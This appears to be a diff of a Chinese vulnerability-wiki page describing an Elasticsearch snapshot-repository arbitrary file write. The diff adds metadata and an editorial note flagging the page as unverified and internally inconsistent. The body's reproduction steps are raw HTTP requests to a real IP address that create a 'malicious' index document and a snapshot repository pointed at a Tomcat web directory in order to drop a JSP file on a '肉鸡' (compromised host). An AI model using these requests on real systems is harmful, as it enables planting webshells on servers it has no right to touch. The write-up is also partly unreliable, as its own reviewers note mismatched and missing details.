@@ -1,8 +1,48 @@
 ---
 source: "wy876 漏洞文库"
+title: "Elasticsearch存在任意文件写入漏洞"
+product: "Elasticsearch Snapshot Repository与同机Tomcat"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "旧版仓库路径控制、索引/快照写权限、可写共享Tomcat Web目录"
+source_status: "unknown"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-f3bd16b066b8c31e4b3877e2"
+entity_id: "ve-f3bd16b066b8c31e4b3877e2"
+schema_version: "1"
 ---
 
 # Elasticsearch存在任意文件写入漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：旧版仓库路径控制、索引/快照写权限、可写共享Tomcat Web目录
+- 证据范围：与360相同5步同JSP载荷，应归并；简介MVEL脚本与实际Snapshot文件写入毫无对应。
+
+### 本次正文校订
+
+- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 版本只写产品名，缺最重要的旧版path.repo边界
+- 第三请求Host为空，保留不必要Cookie与真实外部示例IP，宜统一实验占位
+- 步骤4称写JSP实为执行快照中已有JSP内容，再写test.jsp
+- 缺状态恢复，正文有肉鸡等不专业用语
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 # 一、漏洞描述
 Elasticsearch向使用者提供执行脚本代码的功能，支持mvel, js,groovy,python,和native语言，默认脚本语言为mvel。Elasticsearch存在任意文件写入漏洞
@@ -19,7 +59,7 @@ app="Elasticsearch"
 # 三、漏洞复现
 1、创建一个恶意索引文档
 
-```plain
+```http
 POST /a.jsp/a.jsp/1 HTTP/1.1
 Host: 123.58.224.8:32565
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -39,7 +79,7 @@ Content-Length: 228
 
 2、再创建一个恶意的存储库，其中location的值即为要写入的路径（需要根据肉鸡的tomcat的www目录来决定）
 
-```plain
+```http
 PUT /_snapshot/a.jsp HTTP/1.1
 Host: 123.58.224.8:32565
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -65,7 +105,7 @@ Content-Length: 107
 
 3、存储库验证并创建
 
-```plain
+```http
 PUT /_snapshot/a.jsp/a.jsp HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
